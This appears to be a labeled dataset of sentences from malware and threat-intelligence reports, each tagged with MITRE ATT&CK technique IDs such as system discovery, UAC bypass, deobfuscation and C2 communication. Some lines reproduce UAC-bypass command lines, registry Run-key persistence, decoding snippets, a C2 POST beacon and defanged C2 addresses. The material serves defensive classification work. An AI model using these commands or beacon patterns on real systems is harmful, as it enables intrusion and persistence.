As we can see, the following information is present within this configuration:  Remote Command and Control (C2) server Remote port Sleep timer  Reaver continues to collect various information from the victim machine, including the following:  CPU speed Computer name Username IP Address Microsoft Windows version Physical and virtual memory information  The malware proceeds to communicate with the remote server via HTTP GET and POST requests	['T1082']
Reaver continues to collect various information from the victim machine, including the following:  Computer name Volume serial number Microsoft Windows version CPU speed ANSI code page OEM code page identifier for the operating system Physical and virtual memory information  Reaver encrypts this data using an incremental XOR key and uploads it to the configured remote server on the port specified	['T1082']
Here is an example of the result of ps ax on an infected system:       $ ps ax[...] 566 ?? Ss 0:00.01 /usr/libexec/icloudsyncd -launchd netlogon.bundle[...]     Figure 8: Result of ps ax on an infected system Keychain stealing The OSX/Keydnap backdoor is equipped with a mechanism to gather and exfiltrate passwords and keys stored in OS X’s keychain	['T1082']
This phase will often leverage a specialized tool that automatically collects a wide array of information including credentials, group management policies, and even system logs to better hone further attacks and assure execution of their malware	['T1082']
A noteworthy addition to the Poseidon toolkit is the IGT supertool (Information Gathering toolkit), a bulking 15 megabyte executable that orchestrates a series of different information collections steps, exfiltration, and the cleanup of components	['T1082']
A multilayered approach is a must to securing the organization’s perimeter, especially for information security professionals and system/IT administrators	['T1082']
This variation of the Zebrocy downloader begins by gathering the serial number for the storage volume with the label “C:\” and the computer name	['T1082']
Download & execute Startup (with persistence) Collection of system information (OS, version, installed location, etc.) Self-update Uninstall  This project was created by a user called zettabithf which is linked to a user with the same name in Hack Forums	['T1082']
Low confidence generally means that the information's credibility and/or plausibility is questionable, or that the information is too fragmented or poorly corroborated to make solid analytic inferences, or that [there are] significant concerns or problems with the sources	['T1082']
The verb get can be used in a myriad of ways to retrieve information for a machine, however in this case os get /format: is being abused to download payloads from non-local resources with .xsl extensions	['T1082']
Revenge RAT is a simple and freely available Remote Access Trojan that automatically gathers system information before allowing threat actors to remotely access system components such as webcams, microphones, and various other utilities	['T1082']
itwm= ags= oe= aq= btnG= oprnd= itwm= utm= channel= The XAgent OSX Trojan generates a system specific value that it refers to as an “agent_id”, which is a unique identifier for each compromised host	['T1082']
The value is derived using the IOService to access the IOPlatformUUID property, which is equivalent to the “Hardware UUID” listed in the system information application, as seen in the Figure 3 screenshot of our analysis system	['T1082']
The Trojan uses the first four bytes of this hardware ID as a unique identifier for the system, which in our case was “0000”	['T1082']
The payload sends system information about the infected computer to the C&C server and downloads additional tools.	['T1082']
If it is successful then it will send out basic host information and await further commands.	['T1082']
After decoding their C2 server IP addresses, from obfuscated strings, both trojans will attempt to collect host information and send it to the C2 server.	['T1082']
Operating system's name (i.e., the name of the machine) Operating system's OS architecture Operating system's caption Computer system's domain Computer system's username Computer's public IP address	['T1082']
Once successfully installed in a system, Trickbot will gather system information such as OS, CPU, and memory information, user accounts, lists of installed programs and services.	['T1082']
(To bypass UAC) configurable setting for the process to abuse  Other than these, new coding algorithm has been introduced	['T1548.002']
This request is followed by a call to “GetisrunasAbById” to determine if the Trojan should use “runas” to execute the downloaded executable with elevated privileges, which would display the UAC dialog for the user to click	['T1548.002']
The CAB file contains the following files and functions:  dll: A malicious DLL used to launch batch files (used with cliconfg.exe for UAC bypass)	['T1548.002']
The macro then extracts the CAB file into %systemroo%\system32, using either wusa.exe or expand.exe (depending on the OS) to again bypass UAC prompts Once the files have been extracted, the Visual Basic macro deletes the CAB file and runs the malicious NTWDBLIB.dll via cliconfg.exe (to gain privileges and bypass UAC protections) Command lines used by the Visual Basic macro:  cmd /c wusa %TEMP%\setup.cab /quiet /extract:%SystemRoot%\System32 && del /f /q %TEMP%\setup.cab && cliconfg.exe cmd /c expand %TEMP%\setup.cab -F:* %SystemRoot%\System32 && del /f /q %TEMP%\setup.cab && cliconfg.exe A combination of NTWDBLIB.dll and cliconfg.exe are used to bypass UAC protections; this is a familiar attack on Windows	['T1548.002']
The key differences in this variant:  Two CAB files are encoded into the Word document in text boxes instead of being appended in the DOC file There is one CAB file for an x86 system and another for an x64 system This malware sample uses uacme.exe with dummy.dll to implement the UAC bypass  exe is the program vulnerable to the UAC bypass attack dll runs install.bat to set up the service (same as NTWDBLIB.dll)   exe and dummy.dll may be either 64-bit or 32-bit binaries based on the OS	['T1548.002']
Its encoding method has been modified from time to time, aligned with major upgrade of PlugX itself	['T1124']
Campaign Code and Compile Time Correlation In some cases, there is a close proximity of the compile time of a CARBANAK sample to the month specified in a particular campaign code	['T1124']
These four were then all modified on the same date and time on October 13, 2018 08:21	['T1124']
A possible explanation for this is that the document was copied to another system with an incorrectly set system time, then saved with the incorrect time	['T1124']
When the backdoor establishes a connection to the command and control server, it sets the request period time equal to the specified dwell time for the standby mode	['T1124']
If the dwell time value for the active mode has been set, but the package has not been received, the dwell time value is incremented by the dwell time value for the active period	['T1124']
This action is repeated until the dwell time value is bigger or equal to the dwell time value for the standby mode	['T1124']
Timezone Check The Trojan check to see if the system is configured (“DaylightName”) with one of the following time zones:   Arabic Daylight Time (UTC+3) Arab Daylight Time (UTC+3) Arabian Daylight Time (UTC+4) Middle East Daylight Time (UTC+2) Iran Daylight Time (UTC+3.5)   Human Interaction Check Before executing its functional code, the Trojan presents a dialog box with the following line of code:   Interaction.MsgBox(encodedStringClass.return_user32_bogus_errorcode_(3), MsgBoxStyle.Critical, null);   This dialog box displays  An error occurred while processing user32.dll!, which the user must click the ok button for the Trojan to run its functional code	['T1124']
Figure 3 Countries in which OopsIE will run in based on the time zone Notable Differences The OopsIE Trojan delivered in this attack had functional code that was very similar to the OopsIE variant discussed in our previous blog	['T1124']
In another case the attackers use another code snippet borrowed from the SubTee GitHub project, this time filling in a fully templated .NET application whitelist bypass file: SHA256: 3e9136f95fa55852993cd15b82fe6ec54f78f34584f7689b512a46f0a22907f2: This time the attacker didn’t have to write any of their own code, instead they were simply able to paste their shellcode directly into a template, in order to launch PlugX as a child process of a trusted application	['T1124']
Watches uninstall time, checks time diff (local time vs internet time)	['T1124']
Here’s a python code to decode	['T1140']
It then downloads and decrypts a PNG file	['T1140']
The state command sets a global variable containing a series of Boolean values represented as ASCII values ‘0’ or ‘1’ and also adds itself to the configuration file	['T1140']
Figure 11 Embedded BMP file containing encrypted string data RC4 is used to decrypt this data using a 16-byte key that is stored within the BMP file at offset 0x502	['T1140']
Once decrypted, we are provided with a large list of strings, as seen below (note that the data has been truncated for brevity):  Figure 12 Decrypted strings from embedded BMP file After these strings are decrypted, the malware will load a series of Microsoft Windows API calls to be used later on	['T1140']
In order to decode this data, Comnie first decodes it using base64 with the following non-standard alphabet (note that it is simply the original alphabet in reverse): /+9876543210zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA   The resulting data is then parsed and decrypted using RC4	['T1140']
This DLL serves three main functions: killing antimalware, unpacking and executing the main RAT DLL, and obtaining persistence	['T1140']
Its purpose is to load Msadoz<n>.dll in order to decrypt and execute it in memory	['T1140']
If after the package has been decoded its size is bigger than 3 bytes, the Trojan decrypts its first 11 bytes with XOR using the method similar to the one described above	['T1140']
The decrypted code resolves the necessary API functions, decompresses the embedded PE file with RtlCompressBuffer() using LZNT1 and maps it into memory	['T1140']
Configuration Decryption:  Another small, but same important function in the photo above, is the function for decrypting the data containing the C&C configuration	['T1140']
Figure 2 – The GitHub profile for F0R3X containing both legitimate forked code and the binaries created by the attacker	['T1140']
It also allows macro code to access internal VBA objects for stealthier macro code execution in future attacks	['T1140']
Packet::getData decrypts the received payload and Converter::outString descrambles the result	['T1140']
In the event this is successful the malware will use the following path to store any dropped files:  %COMMONPROGRAMFILES%\services\  In the event it is not successful, this alternative path will be used instead:  %APPDATA%\microsoft\mmc\  It proceeds to load and decrypt and embedded bitmap resource file	['T1140']
In the event this is successful, the malware will use the following path to store any dropped files:  %COMMONPROGRAMFILES%\services\  In the event it is not successful, this alternative path will be used instead:  %APPDATA%\microsoft\mmc\  Reaver.v2 proceeds to decrypt an embedded file using a simple XOR obfuscation routine	['T1140']
ESET’s analysis of a recent backdoor used by TeleBots – the group behind the massive NotPetya ransomware outbreak – uncovers strong code similarities to the Industroyer main backdoor, revealing a rumored connection that was not previously proven The post New TeleBots backdoor: First evidence linking Industroyer to NotPetya appeared first on WeLiveSecurity	['T1140']
"The following code snippet was used to decode strings within OopsIE:out = """" for e in obfuscated_string.split(""-""):    out += chr(int(e)-1)When first run, this OopsIE variant runs a variety of checks to avoid running in an analysis environment, as discussed in the previous section"	['T1140']
This exception invokes the exception handler containing the HTTP communication code, allowing it to run	['T1140']
Figure 1 – The main code from the .NET wrapper, with the Shellcode array being created and executed in a new thread	['T1140']
The first shellcode decrypts a further shellcode block	['T1140']
After decrypting the strings, they must be further decompressed using LZNT1	['T1140']
"It then reads and decrypts the content between these values to yield an IP address as shown below:       ---- BEGIN SSH2 PUBLIC KEY ----Comment: ""rsa-key""AAAAB3NzaC1yc2EAAAABJQAAAQEAhLxZe4Qli9xt/WknQK9CDLWubpgknZ0HIHSd8uV/TJvLsRkjpV+U/tMiMxjDwLAHVtNcww2h8bXTtw387M2Iv/mJjQ9Lv3BdNiM3/KvmlpeJZrrFu2n5UC9=DZKSDAAADOECEDFDOCCDEDIDOCIDEDOCHDDZJS=oT+Ps8wD4f0NBUtDdEdXhWp3nxv/mJjQ9Lv3BCFDBd09UZzLrfBO1S0nxrHsxlJ+bPaJE2Q/oxLXTrpeJ6AHyLyeUaBha3q9niJ=---- END SSH2 PUBLIC KEY ----     A Python script to decode strings encrypted with this technique is given in Appendix B – Python Scripts"	['T1140']
Interestingly, the delivery document borrowed a technique which was publicized in late 2017 as being used by the Sofacy threat actors, embedding the main malicious code in a EXIF metadata property of the document	['T1140']
The main function of the Trojan interacts with its configured C2 server to obtain additional code to execute	['T1140']
The main function gets pertinent strings to communicate with its C2 by calling a sub-function with a specific number that the sub-function uses as a case within a switch statement to decrypt the desired string	['T1140']
We believe the actor used a cryptor on the payload, as it obtains a filename and script from within its resources and decodes these resources by multiplying each byte by negative one	['T1140']
“Knock” also appears in several strings inside the code of SpeakUp	['T1140']
It maintains both code and data in the raw, encrypted blobs of data to be decrypted and used at runtime, and hidden functionality that isn’t exposed until runtime	['T1140']
In total, 29 unique CARROTBAT samples have been identified to date, containing a total of 12 confirmed unique decoy documents	['T1140']
In this particular instance, the payload is encoded via base64, which certutil decodes	['T1140']
"The following function written in Python may be used to decode this file:def decode(data): 	out = """" 	c = 0 	for d in data: 		out += chr(ord(d)^c) 		c+=1 	return outOnce decoded it is discovered that this instance of OceanSalt attempts to communicate with 61.14.210[.]72 on port 7117"	['T1140']
"The following code example shows the false flag being set (5 > 115) and the ETransaksi.diomadnfagaghagh method being called:  int num = 5; int num2 = 155; bool flag = num > num2; if (flag) {     <legitimate Sales System Application code>     }            else {     NewLateBinding.LateCall(ETransaksi.diomadnfagaghagh(), null, ""Invoke"", new object[]     {         null,         new object[0]     }, null, null, null, true);The payload uses this technique to run a chain of methods that eventually carry out its malicious task"	['T1140']
(Source: Dell SecureWorks) Both the redirect code on the compromised site and the exploit code appear and disappear, indicating that the adversaries add the code when they want to leverage the SWC and remove the code when it is not in use to limit the visibility of their operations	['T1140']
The backdoor will load the encrypted configuration file and decrypt it, then use Secure Sockets Layer (SSL) protocol to connect to command-and-control (C&C) servers	['T1140']
The image and table below illustrate TClient’s encrypted configuration that we decrypted (via Python code):  Figure 10	['T1140']
Decrypted backdoor configuration Reverse analysis of TClient allowed us to determine how to decrypt the C&C information	['T1140']
Further collaboration between FireEye as a Service (FaaS), Mandiant and FireEye iSIGHT intelligence uncovered additional victims worldwide, a new suite of tools and novel techniques	['T1543', 'T1543.003']
In addition, web traffic between a service provider’s customer and a service provider is likely to be viewed as benign by network defenders at the customer, allowing the attacker to exfiltrate data stealthily	['T1543', 'T1543.003']
These parameters install it as a service	['T1543', 'T1543.003']
The malware operates on victims’ systems as a svchost-based service and is capable of downloading executables, changing its own configuration, updating its own binaries, terminating its own processes, and activating and terminating denial-of-service attacks	['T1543', 'T1543.003']
The malicious DLL is not a service DLL because it lacks ServiceMain()	['T1543', 'T1543.003']
The victims Data from Cadelle’s C&C servers shows that a large number of Backdoor.Cadelspy infections affected individual users of Iranian internet service providers (ISPs) and hosting services	['T1543', 'T1543.003']
The document brought Talos a new gift - a new version of ROKRAT	['T1543', 'T1543.003']
It downloads the file to the infected machine from the input URL using BITSAdmin, and is called every time the script attempts to download a file	['T1105']
The directory creation.  Downloading the Payloads The remote XSL script downloads twelve files from the C2 server that masquerade themselves as JPEG, GIF, and extensionless files	['T1105']
A thorough explanation of what information is collected can be found in a breakdown by Cofense from late 2018.   The script verifies all parts of the malware have been downloaded.  After downloading the payload, the XSL script checks to make sure every piece of the malware was downloaded.   One of the twelve download commands as detected by the Cybereason platform in same variant of Astaroth.   The twelve downloaded files	['T1105']
Displayed below are these new, xml formatted plugin names “weap_hwi”, “ps”, and “vsnet” in a BlackEnergy configuration file download from a c2 server	['T1105']
One of the discovered config files contained a URL with an as yet unidentified md5: hxxps://46.165.222(dot)28/upgrade/bf0dac805798cc1f633f19ce8ed6382f/upgrade.php Victim set #4 A set of victims discovered installed Siemens SCADA software in their ICS environment was responsible for downloading and executing BlackEnergy	['T1105']
HighShell v5.0 explorer tab allows actor to navigate the file system The HighShell v7.1 variant from the data dump contains similar functionality to its predecessors and continued the tabular approach but expanded even further by splitting out the main functionality across multiple tabs, specifically “Command”, “Explorer”, “Upload”, “Download”, “Sql Server” and “Change Time”	['T1105']
Network Downloader The Network Downloader functionality allows the actor to quickly upload user files from remote victim systems	['T1105']
The sample, in the form of an RTF document, exploited CVE-2016-4117 to download and install a program from a remote C&C server	['T1105']
Symantec determined a more accurate picture of Buckeye’s targets by looking at where Buckeye remained active on the network longer than a day, deployed additional tools, and spread onto multiple computers	['T1105']
The BITS mechanism has existed since Windows XP up to the current Windows 10 versions and was developed to create download/upload jobs, mostly to update the OS itself	['T1105']
It uses the Dropbox API with a hardcoded bearer access token and has the ability to download, upload, and execute files	['T1105']
In this case, after the payload is delivered via an exploit the threat actor places files (named upload.bat, upload.rar, and period.txt, download.txt or silent.txt) in a directory on a Dropbox account	['T1105']
Upon execution, the initialized file downloads multiple malicious payloads from remote servers	['T1105']
Figure 4 Microsoft Word attempting to download the remote template If the C2 server is active at the time the document is opened, it will successfully retrieve the malicious macro and load it in the same Microsoft Word session	['T1105']
If the C2 server is not active at this time, the download will fail and the victim will not receive a prompt to Enable Content as no macro is downloaded	['T1105']
attachedTemplate.dotm xxx 11/15/18 05:35 11/15/18 05:35 109.248.148[.]42    Table 2 Remote templates downloaded by Dear Joohn delivery documents As seen in Table 1, the delivery documents accessed their respective remote templates from four C2 servers at the following IP addresses:  185.203.118[.]198 145.249.105[.]165 188.241.58[.]170  109.248.148[.]42  These initial C2 IP addresses not only hosted the remote templates that subsequently load the first-stage Zebrocy or Cannon payloads, but the IP addresses also hosted the C2 server for the first-stage payloads themselves	['T1105']
The POSHSPY backdoor is designed to download and execute additional PowerShell code and Windows binaries	['T1105']
The RAT, however, had a multitude of functionalities (as listed in the table below) such as to download and execute, compress, encrypt, upload, search directories, etc	['T1105']
The link provided in the malicious email led to a fake VPN Web Portal:  Upon logging in with the credentials provided in the email, the victim is presented with the following page:  The victim is asked to install the “VPN Client” (an .exe file), or, if download fails, to download a password protected zip (with the same .exe file inside)	['T1105']
"This document was alleged to have been written by the Ministry of Reunification as demonstrated by the logo in the top left.Similar to the ""Golden Time"" campaign, this document exploits an EPS vulnerability in order to download and execute shellcode located on a compromised website:hxxp://60chicken[.]co[.]kr/wysiwyg/PEG_temp/logo1.pngThe fake image usage is a common pattern for this group"	['T1105']
The macro contains malicious code that attempts to download content from a remote server	['T1105']
!DWN  Downloads a file from a specified URL	['T1105']
The IRC variant of MPK has a command set (Table 2) that makes this an effective backdoor Trojan, specifically allowing the actors to steal credentials from the targeted system via keylogging, to navigate and interact with the file system, to run arbitrary commands, and to download and execute additional tools on the system	['T1105']
The DOC file contains an embedded OLE Object that, upon execution, triggers the download of an additional DOC file from the stored URL (seen in Figure 3)	['T1105']
Upon opening the malicious DOC attachment, an additional download is triggered from a stored URL within an embedded OLE Object (seen in Figure 4)	['T1105']
Figure 8 shows the network communication of the Pause.ps1 download	['T1105']
I download my tools from GitHub, and so do my victims	['T1105']
The “upload” command downloads files from the CnC and saves them locally in “C:\ProgramData“	['T1105']
Additional information In the advanced stages of this research, we were able not only to observe additional files and tools from the attackers’ arsenal but also some OPSEC mistakes made by the attackers	['T1105']
It will:  Download and execute the backdoor component Replace the content of the downloader Mach-O executable with a decoy, either using a base64-encoded embedded file or by downloading it from the internet Open a decoy document (described later) Close the Terminal window that just opened  The decoy document replaces the downloader Mach-O file, which means the malicious executable is only present in the ZIP file now	['T1105']
This file issued a GET request to download a malicious file from: hxxp://94.23.172.164/dupdatechecker.doc	['T1105']
The .iqy files take advantage of Excel’s willingness to download and include the contents from a remote server in a spreadsheet	['T1105']
Once the victim downloads and executes the email attachment, it runs silently with no additional decoy documents or decoy dialog boxes	['T1105']
13 Copy file to adbFle.tmp, and upload it to the C2	['T1105']
Both responses instruct the malware to download and load a remote plugin	['T1105']
During a file analysis of PLAINTEE in WildFire, we observed the attackers download and execute a plugin during the runtime for that sample	['T1105']
The purpose is to download and execute an additional payload hosted on a compromised website: NavRAT	['T1105']
NavRAT is able to download and execute files located in the attachment of a received email	['T1105']
Figure 2 SYSCON network traffic witnessed during execution   Pivoting on the domain hosting the SYSCON sample, 881.000webhostapp[.]com, revealed a number of additional samples, including a sample of the KONNI malware family, and four 64-bit executable files belonging to the CARROTBAT malware family	['T1105']
CARROTBAT itself is a dropper that allows an attacker to drop and open an embedded decoy file, followed by the execution of a command that will download and run a payload on the targeted machine	['T1105']
Delivery document The delivery document contains a macro that downloads an executable from a remote server	['T1105']
Command_Down_exec: This command downloads and executes new modules.  It takes a url as the argument and uses that to download and execute files	['T1105']
Its presence on a compromised system allows a threat actor to spawn a reverse shell, upload or download files, and capture keystrokes	['T1105']
After reestablishing access, the adversaries download tools such as gsecudmp and WCE that are staged temporarily on websites that TG-3390 previously compromised but never used	['T1105']
The OwaAuth web shell enables a threat actor to upload and download files, launch processes, and execute SQL queries	['T1105']
The script self-scheduling, as well as the scheduling of a script that repeatedly attempts to download and execute the Revenge RAT binary, significantly contribute to the persistence of this infection	['T1105']
We found a mechanism for decrypting, executing, and downloading an additional payload from the C&C server.	['T1105']
certutil is a WIndows component that can download external content to the computer. In a typical attack, the criminals follow this paradigm	['T1105']
The SQLRat script is designed to make a direct SQL connection to a Microsoft database controlled by the attackers and execute the contents of various tables	['T1105']
The backdoor has the capability to download and upload files, execute shell commands, and update its configuration.	['T1105']
BUGJUICE is a backdoor that is executed by launching a benign file and then hijacking the search order to load a malicious dll into it	['T1574.001']
This most likely means there is some type of DLL hijacking going on by distributing a legitimate McAfee binary with MirageFox to load up the DLL properly into a legitimate looking process	['T1574.001']
Whitefly has consistently used a technique known as search order hijacking to run Vcrodat.	['T1574.001']
Attackers can therefore give a malicious DLL the same name as a legitimate DLL but place it ahead of the legitimate version in the search order so that it will be loaded when Windows searches for it.	['T1574.001']
Nibatad is also a loader that leverages search order hijacking, and downloads an encrypted payload to the infected computer.	['T1574.001']
We mentioned earlier that due to the nature of the IE injection technique used by the HTTP-based backdoors, a number of C2 commands were cached to disk	['T1071']
And, according to the collected config files, the group upgraded their malware communications from plain text http to encrypted https in October 2013	['T1071']
Figure 1: Configuration file that adds new C2 server and forces the data-stealing backdoor to use it   Figure 2: Configuration file that adds TCP tunnels and records desktop video Command and Control CARBANAK communicates to its C2 servers via pseudo-HTTP or a custom binary protocol	['T1071']
The example C2s used by older variants of Comnie demonstrates this:  Figure 9 Old Comnie variants collecting C2 information Please refer to the Appendix for a script that may be used to decode C2 information from the older Comnie variants	['T1071']
The URIs used in the HTTP requests are randomly generated	['T1071']
Table 2 Sandbox evasion checks in the C# variant of RogueRobin Like the original version, the C# variant of RogueRobin uses DNS tunneling to communicate with its C2 server using a variety of different DNS query types	['T1071']
Figure 2 Code that issues DNS query to gogle.co if a debugger is detected All DNS requests issued by RogueRobin use the built in nslookup.exe application to communicate to the C2 server and the Trojan will use a variety of regular expressions to extract data from the DNS response	['T1071']
Character  Digit   h 0   i 1   j 2   k 3   l 4   m 5   n 6   o 7   p 8   q 9    Table 4 Character substitution used in RogueRobin The Trojan will use future DNS requests to retrieve jobs from the C2 server, which the Trojan will handle as commands	['T1071']
The x_mode command is disabled by default, but when enabled via a command received from the DNS tunneling channel, it allows RogueRobin to receive a unique identifier and to get jobs by using Google Drive API requests	['T1071']
Background From October 2012 to May 2014, FireEye observed APT12 utilizing RIPTIDE, a proxy-aware backdoor that communicates via HTTP to a hard-coded command and control (C2) server	['T1071']
Similar to RIPTIDE and HIGHTIDE, the WATERSPOUT backdoor is an HTTP-based backdoor that communicates with its C2 server	['T1071']
11/1/18 sahro.bella7 trala.cosh2 Bishtr.cam47 Lobrek.chizh Cervot.woprov    Table 5 Gathered C# Cannon samples As mentioned in our initial blog, the actor controlled email address acting as the C2 was sahro.bella7[at]post.cz, but all previous samples of Cannon used sym777.g[at]post.cz	['T1071']
Even though Delphi Cannon uses POP3S and SMTPS for its C2 communications like Cannon, it is arguably easier to defend against as it uses an actor owned domain that defenders can easily block and not a legitimate email provider such as Seznam	['T1071']
The screenshot in Figure 8 of the inf method within a Cannon sample (SHA256: 4405cfbf28…) shows the information gathered that is exfiltrated to the C2 via email, specifically with RunningPlace and LogicalDrives header strings:  Figure 8 inf method used by Cannon When comparing the two Cannon variants, we found a method within a Delphi Cannon sample (SHA256: 5a02d4e5f6…) showing the use of Running place and Logical_Drivers as header strings to the system information it is collecting and sending to the C2 via email	['T1071']
The shellcode retrieves an additional payload by connecting to the following C2 server using DNS: aaa.stage.14919005.www1.proslr3[.]com Once a successful reply is received from the command and control (C2) server, the PowerShell script executes the embedded Cobalt Strike shellcode	['T1071']
Retriever uses .NET web services and the SoapHttpClientProtocol class to communicate with its C2 server, which generates HTTP requests resembling the example request in Figure 4	['T1071']
The shellcode executed by this command is the same as in the delivery documents as well, specifically taken from Metasploit to obtain additional shellcode to execute using an HTTP request to the following URL: http://www7.chrome-up[.]date/0m5EE We are unsure of the shellcode hosted at this URL, as we were unable to coerce the C2 server to provide a payload	['T1071']
Once these variables are set, the malware uses the SoapHttpClientProtocol class to communicate with its C2 server, which issues an HTTP POST requests that appears as:  As you can see from the above request, the SoapHttpClientProtocol class neatly structures data into an HTTP POST request	['T1071']
Table 3: FELIXROOT backdoor parameters  Cryptography All data is transferred to C2 servers using AES encryption and the IbindCtx COM interface using HTTP or HTTPS protocol	['T1071']
http://www.cankayasrc[.]com/style/js/main.php http://ektamservis[.]com/includes/main.php http://gtme[.]ae/font-awesome/css/main.php  Recommendations for organizations Effective protection from targeted attacks focuses on advanced detective, preventive and investigative capabilities via solutions and training, allowing an organization to control any activities on their network or suspicious files on user systems	['T1071']
This information can then be transmitted to the attacker using protocols such as FTP, HTTP, and SMTP	['T1071']
tfvn[.]com[.]vnshirkeswitch[.]netguideofgeorgia[.]orggulfclouds[.]sitejhssourcingltd[.]comkamagra4uk[.]compioneerfitting[.]compositronicsindia[.]comscseguros[.]ptspldernet[.]comtoshioco[.]comwww[.]happytohelpyou[.]inIP addressesThe following IP addresses have been observed to be associated with malware campaigns.112.213.89[.]4067.23.254[.]6162.212.33[.]98153.92.5[.]124185.117.22[.]19723.94.188[.]24667.23.254[.]17072.52.150[.]218148.66.136[.]62107.180.24[.]253108.179.246[.]13818.221.35[.]21494.46.15[.]20066.23.237[.]18672.52.150[.]218URLs:The following URLs have been observed to be associated with malware campaigns.https[:]//a[.]pomf[.]cat/http[:]//pomf[.]cat/upload[.]php	['T1071']
The initial DNS query sent by the payload to obtain the system specific identifier uses the following structure, which includes the current process identifier (PID) as the subdomain of the C2 domain: <current process id>.<c2 domain> The C2 server will provide the system specific identifier within the answer portion of the DNS response	['T1071']
This command will automatically set the DNS type to use for actual C2   $showconfig Uploads the current configuration of the payload to the C2   slpx:\d+ Sets the sleep interval between outbound DNS requests   $fileUpload Downloads contents from the C2 server and writes them to a specified file    Table 3 Commands available to payload Campaign Analysis The following domains are configured within the payload to be used as C2s	['T1071']
If that HTTPS request is not successful, the downloader will issue an HTTP request	['T1071']
Lastly, if the HTTP request is not successful, the downloader will fallback to using DNS tunneling to establish communications	['T1071']
The payload will construct a message that has the following structure that it will then send to the C2:   bye<char uuid[35]>d   The message above is sent via a simple HTTPS/HTTP POST request to the C2 server	['T1071']
As seen in the above request, the Trojan will generate a URL for its beacon with the following structure:http://<c2 domain>/chk?<hex(Environment.UserName/Environment.MachineName)> The Trojan will issue a request to this URL to check (hence the chk string in the URL) to see if the C2 server has a command for the Trojan to run	['T1071']
[1] https://www.clearskysec.com/report-the-copykittens-are-targeting-israelis/ [2] https://www.clearskysec.com/copykitten-jpost/	['T1071']
After the C2 information has been collected, BADNEWS leverages HTTP for communication with the remote servers	['T1071']
33 Download specified file to %TEMP%\up and execute it in a new process      During C2 communications, BADNEWS will communicate to the C2 previously identified via HTTP	['T1071']
Exfiltrate data using HTTP over HTTP over AES over XOR, or any combination of the available transports	['T1071']
Deep Discovery Inspector protects customers from these threats via this DDI Rule:  DDI Rule 18 : DNS response of a queried malware Command and Control domain DDI Rule 15 : Many unsuccessful logon attempts (nbt_scan.exe) DDI Rule 38 : Multiple unsuccessful logon attempts (nbt_scan.exe)  TippingPoint customers are protected from these threats via these ThreatDV filters:  27218: HTTP: TROJ_RATANKBA_A Checkin 28219: HTTP: TROJ_RATANKBA_A Checkin 02 27220: HTTPS: TROJ_RATANKBA_A Checkin 27221: HTTP: Sundown EK Flash Exploit (SWF_EXPLOYT.YYRQ)  A list of related Indicators of Compromise (IoCs) can be found in this appendix	['T1071']
IcedCoffee is a fairly basic backdoor which uses WMI to collect a variety of system and user information from the system, which is then encoded with base64, encrypted with RC4 and submitted via HTTP POST to the C2 server	['T1071']
It then calls the subfunction with the argument of 2 to get the string that it will use as the HTTP POST request	['T1071']
The resulting HTTP POST request looks like the following: POST http://185.25.50[.]93/syshelp/kd8812u/protocol.php HTTP/1.1 Host: 185.25.50[.]93 Content-Type: application/x-www-form-urlencoded Content-Length: 21 porg=44908AE0524f422d We have not seen a C2 server respond to our requests during our analysis, however, we do know how the Trojan will parse the C2’s response for specific data	['T1071']
Victim Registration SpeakUp uses POST and GET requests over HTTP to communicate with its main C&C which is the compromised website of speakupomaha[.]com	['T1071']
It uses the legitimate Naver email platform in order to communicate with the attackers via email	['T1071']
Command & Control  The malware communicates with the Naver email platform in order to communicate with the operator	['T1071']
It communicates with ftp.bytehost31[.]org via FTP for command and control (C2)	['T1071']
Domains  http://mdzz2019.noip[.]cn:19931 http://mdzz2019.noip[.]cn:3654/  From my analyses, I was able to identify http://mdzz2019.noip[.]cn:19931 as its main C2 url.  This is a dynamic DNS, meaning the actual IP changes quite frequently	['T1071']
The Trojan uses HTTP POST requests, as seen in Figure 1 to send data to the C2 server, and GET requests to receive commands from the server, as seen in Figure 2	['T1071']
Figure 1 XAgent macOS HTTP POST request  Figure 2 XAgent mscOS HTTP GET request The C2 URLs generated by XAgentOSX are very similar to those created by its Windows-based counterpart	['T1071']
Figure 3 Hardware ID used by XAgent to uniquely identify compromised hosts When generating the URLs within the HTTP POST and GET requests, XAgent sets one HTTP parameter using a specific data structure that contains this agent_id value	['T1071']
it operates over DNS traffic, but can also switch to encrypted channels such as HTTPS or SSL	['T1071']
HAWKBALL is a backdoor that communicates to a single hard-coded C2 server using HTTP	['T1071']
Persistence is maintained through a Run registry key	['T1547.001']
This marker indicates the presence of an encrypted MZ marker in the .hwp file and is decrypted by the malware and written to the Startup folder for the user:  C:\Documents and Settings\<username>\Start Menu\Programs\Startup\viso.exe  This step establishes the persistence of the malware across reboots on the endpoint Once the decrypted MZ marker is written to the Startup folder, the 2.hwp is deleted from the endpoint  The malware might perform this activity for a couple of reasons:  Establish persistence for itself on the endpoint Establish persistence of another component of the malware on the endpoint Update itself on endpoint after a separate updater component downloads the update from the control server  The malware has limited reconnaissance and data-gathering capabilities and is not full-fledged spyware	['T1547.001']
The two variants of MPK share the same registry key that the Trojan uses to automatically run each time the system starts, specifically: [HKLM and HKCU]\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\explorer Both MPK variants include key loggers that are extremely similar in functionality in addition to having the same strings used for headers within the key log file	['T1547.001']
The RunAtLoad key will command launchd to run the daemon when the operating system starts up, while the KeepAlive key will command launchd to let the process run indefinitely	['T1547.001']
Once the user clicks on the fake Adobe Flash Player installer, it will extract/create the following malicious payload into the Startup directory to maintain its persistence:	['T1547.001']
Register the RUN key in the registry below, so that the VBS file is executed every time the machine starts	['T1547.001']
A new registry entry is created at HKEY_CURRENT_USERS\Software\Microsoft\Windows\CurrentVersion\Run\Graphics with a value of “C:\ ProgramData \ Initech \Initech.exe” /run.	['T1547.001']
When each file is encrypted, registry keys are created under HKU\{SID}\Software\Microsoft\ RestartManager \ which are used to track metadata pertaining to the file being encrypted, such as owner, sequence, session and file hash	['T1547.001']
When the .lnk file is initialized, it spawns a CMD process	['T1547.009']
We have covered recent FIN7 activity in previous public blog posts:   FIN7 Spear Phishing Campaign Targets Personnel Involved in SEC Filings  FIN7 Evolution and the Phishing LNK  To SDB, Or Not To SDB: FIN7 Leveraging Shim Databases for Persistence  The FireEye iSIGHT Intelligence MySIGHT Portal contains additional information on our investigations and observations into FIN7 activity	['T1547.009']
The .zip archive attached to the email contains a Windows shortcut (.lnk) file with the Microsoft Internet Explorer logo	['T1547.009']
Clicking on the shortcut ultimately leads to Backdoor.Pirpi being downloaded and executed on the affected computer	['T1547.009']
Comnie is able to achieve persistence via a .lnk file that is stored within the victim’s startup path	['T1547.009']
